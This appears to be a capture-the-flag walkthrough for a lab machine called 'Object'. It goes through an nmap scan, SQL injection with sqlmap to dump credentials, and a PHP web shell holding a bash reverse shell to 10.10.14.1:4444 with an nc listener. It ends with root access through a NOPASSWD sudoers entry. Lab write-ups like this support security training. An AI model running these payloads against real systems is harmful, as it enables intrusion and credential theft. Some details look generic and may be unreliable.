A comprehensive walkthrough of the HTB 'Object' machine. This guide includes enumeration, exploitation, and privilege escalation techniques.

### Enumeration

We start with an `nmap` scan to identify open ports and services:

```bash
nmap -sC -sV -oN object_nmap.txt 10.10.10.10
```

The scan results showed:
```bash
PORT   STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.6
```

### Web Enumeration
Accessing the web server revealed a login page vulnerable to SQL injection. Using sqlmap to confirm:

```bash
sqlmap -u "http://10.10.10.10/login.php" --forms --dump
```

Credentials retrieved:

admin:password123

### Exploitation
Logged in as admin, we found a file upload feature. Using Burp Suite to intercept and modify the file, a PHP reverse shell was uploaded:

```bash
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'");
?>
```

Setting up a listener and triggering the shell:

```bash
nc -lvnp 4444
```

### Privilege Escalation
Further enumeration revealed a misconfigured /etc/sudoers file:

username ALL=(ALL) NOPASSWD: ALL

Executing sudo -i granted root access.

### Root Flag
The root flag was found in the usual location:

cat /root/root.txt

### Conclusion
This machine emphasizes the importance of thorough enumeration and knowledge of common misconfigurations.
